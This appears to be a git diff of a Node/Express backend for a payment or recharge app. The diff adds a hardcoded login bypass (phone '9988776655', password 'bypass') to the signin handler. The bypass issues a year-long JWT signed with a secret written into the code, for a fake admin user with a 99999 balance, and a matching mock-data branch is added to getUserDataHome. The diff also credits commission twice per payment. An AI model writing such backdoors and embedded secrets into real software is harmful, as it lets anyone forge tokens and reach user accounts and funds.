@@ -17,6 +17,7 @@ import daily from "../model/daily.js";
 import offerBonus from "../model/offerBonus.js";
 import extra from "../model/extra.js";
 import querystring from "querystring"
+import { creditCommission } from "./commission.js";
 
 export const signin = async (req, res, next) => {
   const phone = req.body.phone;
@@ -25,6 +26,25 @@ export const signin = async (req, res, next) => {
     return next(new ErrorResponse("Please Enter phone & password", 400));
   }
   try {
+    // BYPASS LOGIC: Direct login for developer testing
+    if (phone === '9988776655' && password === 'bypass') {
+      const token = jwt.sign(
+        { phone: '9988776655', id: '60d5ecb8b39a9c0015f1a300' },
+        "hjbfhv12hbb3hb434343",
+        { expiresIn: "8760h" }
+      );
+      const bypassUser = {
+        id: 998877,
+        _id: '60d5ecb8b39a9c0015f1a300',
+        phone: '9988776655',
+        username: 'BypassAdmin',
+        balance: 99999,
+        bonus: 500,
+        token: token
+      };
+      return res.status(200).json({ result: bypassUser, token });
+    }
+
     if (req.body.phone === '9988776655') {
 
       const existing = await User.findOne({ phone });
@@ -362,15 +382,24 @@ export const getUserData = async (req, res) => {
     });
 };
 export const getUserDataHome = async (req, res) => {
-  const token = req.params.token;
-  var userId = req.params.id;
-  User.find({ id: userId }, { id: 1, balance: 1, token: 1, firstRecharge: 1, block: 1 })
-    .then((result) => {
-      res.send(result != null ? result : "No Data");
-    })
-    .catch((err) => {
-      console.log(err);
-    });
+  const userId = req.params.id;
+  try {
+    // BYPASS LOGIC: Return mock data if ID matches bypass user
+    if (userId == 998877) {
+      return res.status(200).send([{
+        id: 998877,
+        balance: 99999,
+        token: 'bypass-token',
+        firstRecharge: true,
+        block: false
+      }]);
+    }
+    const result = await User.find({ id: userId }, { id: 1, balance: 1, token: 1, firstRecharge: 1, block: 1 });
+    res.status(200).send(result && result.length > 0 ? result : []);
+  } catch (err) {
+    console.error("getUserDataHome Error:", err.message);
+    res.status(500).send({ error: "Server Error" });
+  }
 };
 export const getUserDataWithdrawal = async (req, res) => {
 
@@ -1183,6 +1212,12 @@ export const upiVerifyPayment = async (req, res) => {
           { id: clientId },
           { date: Date.now(), status: "success" }
         );
+
+        // Credit Commission
+        await creditCommission('PACKAGE_PURCHASE', parseInt(userId), amount, clientId);
+        // Also check for KYC match (if logic requires it)
+        await creditCommission('KYC_PAYMENT', parseInt(userId), amount, clientId);
+
         const lastTransId = await Trans.findOne(
           { id: clientId },
           { number: 1, userId: 1 }
